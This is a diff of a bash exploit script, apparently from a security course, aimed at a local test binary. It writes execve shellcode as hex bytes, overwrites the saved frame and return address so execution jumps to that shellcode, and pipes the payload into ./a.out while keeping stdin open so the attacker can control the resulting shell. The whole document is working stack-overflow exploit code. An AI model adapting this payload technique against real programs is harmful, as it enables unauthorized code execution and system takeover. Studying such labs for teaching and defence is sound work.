@@ -1,7 +1,7 @@
 #!/bin/bash
 
-#Gets the correct password address to write into
-echo -ne "\n\n\n" | ./modified > \dev\null 2> passNoGdb.txt
+#Gets the correct password and msg addresses to write into
+echo -ne "\n\n\n" | ./printMsg > msg.txt 2> passNoGdb.txt
 PASSADDRESS=`cat passNoGdb.txt`
 MSGADDRESS=`cat msg.txt`
 
@@ -22,6 +22,6 @@ echo -ne "\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x80\x10\x60\x00\x48\xc7\xc6\x
 #Continues in buffer - rest of evil, good, ebp, and return value (pointing to shell)
 echo -ne "EVILLLL$MSGHEX\0\0\0\0\0$PASSHEX\0\0$SHELLHEX\0\0\n" >> part5NoGdbinput.txt 
 
-#Command to run executable with proper string
+#Command to run executable with proper string ( '-' character allows additional input from user to controll the shell )
 cat part5NoGdbinput.txt - | ./a.out 
 
